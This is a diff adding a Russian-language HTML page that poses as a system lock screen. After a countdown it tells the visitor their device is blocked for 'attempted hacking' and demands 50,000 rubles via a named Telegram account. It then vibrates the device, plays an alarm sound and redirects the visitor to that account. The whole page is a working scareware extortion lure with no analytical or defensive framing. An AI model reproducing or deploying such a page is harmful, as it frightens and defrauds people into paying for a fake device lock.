@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ВНИМАНИЕ! Блокировка</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #0066cc, #003366);
+            color: white;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            transition: all 0.5s;
+            overflow: hidden;
+        }
+        #countdown {
+            font-size: 120px;
+            font-weight: bold;
+            margin: 20px 0;
+            text-shadow: 0 0 15px rgba(0,0,0,0.7);
+            animation: pulse 1s infinite alternate;
+        }
+        #message {
+            font-size: 26px;
+            margin: 30px 0;
+            display: none;
+            max-width: 90%;
+            line-height: 1.5;
+            text-shadow: 0 0 5px black;
+        }
+        #finger {
+            font-size: 100px;
+            display: none;
+            animation: shake 0.3s infinite;
+            filter: drop-shadow(0 0 8px red);
+            margin-bottom: 20px;
+        }
+        #redirect {
+            font-size: 18px;
+            margin-top: 20px;
+            display: none;
+            color: #ccc;
+            background: rgba(0,0,0,0.4);
+            padding: 12px 25px;
+            border-radius: 25px;
+            backdrop-filter: blur(5px);
+        }
+        #logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-weight: bold;
+            opacity: 0.8;
+            font-size: 18px;
+        }
+        @keyframes shake {
+            0%, 100% { transform: rotate(-15deg) scale(1.3); }
+            50% { transform: rotate(15deg) scale(1.3); }
+        }
+        @keyframes pulse {
+            from { transform: scale(1); opacity: 0.8; }
+            to { transform: scale(1.1); opacity: 1; }
+        }
+        .glitch {
+            animation: glitch 1s linear infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: -2px 0 red, 2px 0 cyan; }
+            25% { text-shadow: 2px 0 cyan, -2px 0 red; }
+            50% { text-shadow: -3px 0 red, 3px 0 cyan; }
+            100% { text-shadow: 3px 0 cyan, -3px 0 red; }
+        }
+    </style>
+</head>
+<body>
+    <div id="logo">SYSTEM ALERT</div>
+    <div id="countdown">5</div>
+    <div id="finger">🖕</div>
+    <div id="message" class="glitch">
+        ⚠️ ВАШЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО!<br><br>
+        Причина: <span style="color:yellow;">Попытка взлома</span><br><br>
+        Для разблокировки переведите <span style="color:gold;font-weight:bold;">50.000₽</span><br>
+        на Telegram: <span style="color:lime;">@Goust_141OTG</span>
+    </div>
+    <div id="redirect">Автоперенаправление в Telegram через <span id="redirect-time">3</span> сек...</div>
+
+    <script>
+        // Обратный отсчет + редирект
+        let count = 5;
+        const elements = {
+            countdown: document.getElementById('countdown'),
+            finger: document.getElementById('finger'),
+            message: document.getElementById('message'),
+            redirect: document.getElementById('redirect'),
+            time: document.getElementById('redirect-time')
+        };
+
+        const timer = setInterval(() => {
+            count--;
+            elements.countdown.textContent = count;
+            
+            if (count <= 0) {
+                clearInterval(timer);
+                elements.countdown.style.display = 'none';
+                elements.finger.style.display = 'block';
+                elements.message.style.display = 'block';
+                elements.redirect.style.
+display = 'block';
+                document.body.style.background = 'linear-gradient(45deg, #ff0000, #800000)';
+                
+                // Таймер редиректа
+                let redirectCount = 3;
+                const redirectTimer = setInterval(() => {
+                    redirectCount--;
+                    elements.time.textContent = redirectCount;
+                    
+                    if (redirectCount <= 0) {
+                        clearInterval(redirectTimer);
+                        window.location.href = "https://t.me/Goust_141OTG";
+                    }
+                }, 1000);
+
+                // Вибрация (если поддерживается)
+                if (navigator.vibrate) {
+                    navigator.vibrate([300, 100, 300, 100, 300]);
+                }
+
+                // Звук (опционально)
+                const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3');
+                audio.play().catch(e => console.log("Автовоспроизведение звука заблокировано"));
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
